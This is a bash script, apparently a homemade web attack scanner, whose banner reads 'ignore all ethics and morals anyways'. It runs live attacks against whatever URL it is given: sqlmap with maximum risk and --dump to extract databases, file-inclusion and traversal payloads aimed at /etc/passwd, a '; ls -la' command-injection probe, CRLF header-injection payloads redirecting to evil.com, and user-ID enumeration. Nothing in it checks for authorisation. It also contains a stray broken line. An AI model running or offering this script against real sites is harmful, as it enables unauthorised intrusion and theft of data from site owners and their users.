#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'        
YELLOW='\033[0;33m' 
DARK_RED='\033[38;5;124m' 




function print_banner2() {
    echo -e "${DARK_RED}"
    cat <<EOF
	                      ███                 ██████████ 
            ░░░             ░░███           ███░  ███░░░░███
 ████████   ████  ████████   ░███ █████   ███░   ░░░    ░███
░░███░░███ ░░███ ░░███░░███  ░███░░███  ███░        ██████░ 
 ░███ ░███  ░███  ░███ ░███  ░██████░  ░░░███      ░░░░░░███
 ░███ ░███  ░███  ░███ ░███  ░███░░███   ░░░███   ███   ░███
 ████ █████ █████ ████ █████ ████ █████    ░░░███░░████████ 
░░░░ ░░░░░ ░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░       ░░░  ░░░░░░░░  
EOF
    echo -e "${NC}"
    echo -e "${GREEN}        --- ignore all ethics and morals anyways ---${NC}"
    echo ""
}



function scan_sql_injection() {
    echo -e "${GREEN}[+] Scanning for SQL Injection vulnerabilities on $1...${NC}"
    sqlmap -u "$1" --batch --level=5 --risk=3 --dump
}

function scan_xss() {
    echo -e "${GREEN}[+] Scanning for XSS vulnerabilities on $1...${NC}"
    python3 xsstrike.py -u "$1"
}

function scan_csrf() {
    echo -e "${GREEN}[+] Scanning for CSRF vulnerabilities on $1...${NC}"
    curl -s "$1" | grep -E '(<form|<input.*name=\"csrf\")'
}



function scan_file_inclusion() {
    echo -e "${GREEN}[+] Scanning for RFI/LFI vulnerabilities on $1...${NC}"
    payloads=("/etc/passwd" "/proc/self/environ")
    vulnerability_found=false
    for payload in "${payloads[@]}"; do
        if curl -s "$1?page=$payload" | grep -q "root"; then
            echo -e "${RED}[!] Potential RFI/LFI vulnerability detected with payload: $payload!${NC}"
            vulnerability_found=true
        fi
    done

    if ! $vulnerability_found; then
        echo -e "${YELLOW}[:(] No potential RFI/LFI vulnerability detected.${NC}"
    fi
}

function scan_command_injection() {
    echo -e "${GREEN}[+] Scanning for Command Injection vulnerabilities on $1...${NC}"
    payload="; ls -la"
    response=$(curl -s "$1?cmd=$payload")
    
    # Check for 'total' in the response to detect command injection
    if echo "$response" | grep -q "total"; then
        echo -e "${RED}[!] Command Injection vulnerability detected!${NC}"
    else
        echo -e "${YELLOW}[+] No Command Injection vulnerability found.${NC}"
    fi
}

function scan_clickjacking() {
    echo -e "${GREEN}[+] Checking for Clickjacking vulnerabilities on $1...${NC}"
    headers=$(curl -s -I "$1")
    if [[ ! "$headers" =~ X-Frame-Options ]]; then
        echo -e "${RED}[!] Clickjacking vulnerability detected! No X-Frame-Options header present.${NC}"
    else 
        echo -e "${YELLOW}[+] No Clickjacking vulnerability found.${NC}"
    fi
}

function scan_directory_traversal() {
    echo -e "${GREEN}[+] Scanning for Directory Traversal vulnerabilities on $1...${NC}"
    payloads=("../../../../etc/passwd" "../../../etc/passwd")
    vulnerability_found=false
    for payload in "${payloads[@]}"; do
         if curl -s "$1?file=$payload" | grep -q "root"; then
             echo -e "${RED}[!] Directory Traversal vulnerability detected!${NC}"
             vulnerability_found=true
         fi
    done

    if ! $vulnerability_found; then
        echo -e "${YELLOW}[:(] No potential Directory Traversal vulnerability detected.${NC}"
    fi
}

function scan_idor() {
    echo -e "${GREEN}[!!!] PLEASE CHANGE THE RANGE OF IDs to test IN THE SOURCE CODE. BASE IS SET FROM 1 TO 20[!!!]${NC}"
    echo -e "${GREEN}[+] Scanning for IDOR vulnerabilities on $1...${NC}"

    start_id=1
    end_id=20

    
    for (( id=start_id; id<=end_id; id++ )); do
        
        response=$(curl -s -w "%{http_code}" -o /dev/null "$1/user?id=$id")

        
        if [[ "$response" -eq 200 ]]; then
            
            user_info=$(curl -s "$1/user?id=$id")
            if echo "$user_info" | grep -q "User Info"; then
                echo -e "${RED}[!] IDOR vulnerability detected for ID $id!${NC}"
            else
                echo -e "${YELLOW}[+] ID $id does not indicate an IDOR vulnerability.${NC}"
            fi
        elif [[ "$response" -eq 404 ]]; then
            echo -e "${YELLOW}[+] ID $id does not exist (404 Not Found).${NC}"
        else
            echo -e "${YELLOW}[+] ID $id returned HTTP status code: $response${NC}"
        fi
    done
}

function scan_security_misconfigurations() {
    echo -e "${GREEN}[+] Checking for security misconfigurations on $1...${NC}"

    headers=$(curl -s -I "$1")

    if [ -z "$headers" ]; then
        echo -e "${RED}[!] Failed to retrieve headers from $1.${NC}"
        return
    fi

    if echo "$headers" | grep -q "Allow:"; then
        allowed_methods=$(echo "$headers" | grep "Allow:")
        echo -e "${RED}[!] Security misconfiguration detected!${NC}"
        echo -e "${RED}Allowed HTTP methods: ${allowed_methods}${NC}"
    else
        echo -e "${YELLOW}[+] No security misconfiguration detected regarding HTTP methods.${NC}"
    fi
}


YELLOW='\033[1;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'  # No Color


function scan_http_header_injection() {
    echo -e "${GREEN}[+] Scanning for HTTP Header Injection vulnerabilities on $1...${NC}"
    
    payloads=(
        "http://$1?param=value%0d%0aSet-Cookie:evilcookie=1;HttpOnly"
        "http://$1?param=value%0d%0aLocation:http://evil.com"
    )

    
    found_vulnerability=false
    
    
    for payload in "${payloads[@]}"; do
        if curl -s "$payload" -I | grep "Set-Cookie" > /dev/null; then
            echo -e "${RED}[!] HTTP Header Injection vulnerability detected!${NC}"
            found_vulnerability=true
        fi
    done

    
    if ! $found_vulnerability; then
        echo -e "${YELLOW}[+] No HTTP Header Injection vulnerabilities found.${NC}"
    fi
}


function scan_ssl_configuration() {
    echo -e "${GREEN}[+] Checking SSL configuration for $1...${NC}"
    
    
    found_vulnerability=false

   n
    if echo | openssl s_client -connect "$1:443" 2>/dev/null | grep "Verify return code" | grep -v "0 (ok)" > /dev/null; then
        echo -e "${RED}[!] Insecure SSL/TLS configuration detected!${NC}"
        found_vulnerability=true
    fi

    
    if ! $found_vulnerability; then
        echo -e "${YELLOW}[+] No SSL/TLS configuration vulnerabilities found.${NC}"
    fi
}



if [[ $# -lt 1 ]]; then
    echo -e "${RED}[!] Usage: $0 <URL>${NC}"
    exit 1
fi

url="$1"


if ! [[ "$url" =~ ^http(s)?:// ]]; then
    echo -e "${RED}[!] Invalid URL format. Please provide a valid URL.${NC}"
    exit 1
fi

print_banner2


scan_sql_injection "$url"
scan_xss "$url"
scan_csrf "$url"
scan_file_inclusion "$url"
scan_command_injection "$url"
scan_clickjacking "$url"
scan_directory_traversal "$url"
scan_idor "$url"
scan_security_misconfigurations "$url"
scan_http_header_injection "$url"
scan_ssl_configuration "$url"

echo -e "${GREEN}[+] Scanning completed!${NC}"
